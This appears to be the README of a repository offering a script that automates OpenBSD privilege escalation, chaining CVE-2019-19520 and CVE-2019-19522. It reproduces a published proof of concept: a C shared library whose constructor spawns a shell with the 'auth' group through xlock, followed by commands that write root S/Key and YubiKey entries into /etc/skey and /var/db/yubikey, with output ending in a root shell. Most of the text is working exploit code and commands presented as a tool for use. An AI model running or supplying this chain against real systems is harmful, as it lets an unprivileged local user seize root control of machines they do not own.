# Openbsd-Privilege-Escalation
A Script that automates the process of escalating privileges on openbsd system (CVE-2019-19520)  by exploiting the xlock binary and againing it's sgid and escalating to the root user by (CVE-2019-19522) exploiting the privileges of auth group and adding keys to the Skey or Yubikey


The C code is pretty much a copy of the original poc from: https://www.openwall.com/lists/oss-security/2019/12/04/5






CVE-2019-19522: Local privilege escalation via S/Key and YubiKey
==============================================================================

On OpenBSD, /usr/X11R6/bin/xlock is installed by default and is
set-group-ID "auth", not set-user-ID; the following check is therefore
incomplete and should use issetugid() instead:

------------------------------------------------------------------------------
101 _X_HIDDEN void *
102 driOpenDriver(const char *driverName)
103 {
...
113    if (geteuid() == getuid()) {
114       /* don't allow setuid apps to use LIBGL_DRIVERS_PATH */
115       libPaths = getenv("LIBGL_DRIVERS_PATH");


A local attacker can exploit this vulnerability and dlopen() their own
driver to obtain the privileges of the group "auth":

$ id
uid=32767(nobody) gid=32767(nobody) groups=32767(nobody)

$ cd /tmp

$ cat > swrast_dri.c << "EOF"
#include <paths.h>
#include <sys/types.h>
#include <unistd.h>

static void __attribute__ ((constructor)) _init (void) {
    gid_t rgid, egid, sgid;
    if (getresgid(&rgid, &egid, &sgid) != 0) _exit(__LINE__);
    if (setresgid(sgid, sgid, sgid) != 0) _exit(__LINE__);

    char * const argv[] = { _PATH_KSHELL, NULL };
    execve(argv[0], argv, NULL);
    _exit(__LINE__);
}
EOF

$ gcc -fpic -shared -s -o swrast_dri.so swrast_dri.c

$ env -i /usr/X11R6/bin/Xvfb :66 -cc 0 &
[1] 2706

$ env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display :66

$ id
uid=32767(nobody) gid=11(auth) groups=32767(nobody)


Now we have obtained the group - auth's privileges, we can now exploit the privileges by adding our own root keys to Skey or Yubikey


CVE-2019-19522: Local privilege escalation via S/Key and YubiKey
==============================================================================

If the S/Key or YubiKey authentication type is enabled (they are both
installed by default but disabled), then a local attacker can exploit
the privileges of the group "auth" to obtain the full privileges of the
user "root" (because login_skey and login_yubikey do not verify that the
files in /etc/skey and /var/db/yubikey belong to the correct user, and
these directories are both writable by the group "auth").

(Note: to obtain the privileges of the group "auth", a local attacker
can first exploit CVE-2019-19520 in xlock.)

If S/Key is enabled (via skeyinit -E), a local attacker with "auth"
privileges can add an S/Key entry (a file in /etc/skey) for the user
"root" (if this file already exists, the attacker cannot simply remove
or rename it, because /etc/skey is sticky; a simple workaround exists,
and is left as an exercise for the interested reader):


$ id
uid=32767(nobody) gid=11(auth) groups=32767(nobody)

$ echo 'root md5 0100 obsd91335 8b6d96e0ef1b1c21' > /etc/skey/root

$ chmod 0600 /etc/skey/root

$ env -i TERM=vt220 su -l -a skey
otp-md5 99 obsd91335
S/Key Password: EGG LARD GROW HOG DRAG LAIN

#id
uid=0(root) gid=0(wheel) ...


If YubiKey is enabled (via login.conf), a local attacker with "auth"
privileges can add a YubiKey entry (two files in /var/db/yubikey) for
the user "root" (if these files already exist, the attacker can simply
remove or rename them, because /var/db/yubikey is not sticky):


$ id
uid=32767(nobody) gid=11(auth) groups=32767(nobody)

$ echo 32d32ddfb7d5 > /var/db/yubikey/root.uid

$ echo 554d5eedfd75fb96cc74d52609505216 > /var/db/yubikey/root.key

$ env -i TERM=vt220 su -l -a yubikey
Password: krkhgtuhdnjclrikikklulkldlutreul

#id
uid=0(root) gid=0(wheel) ...
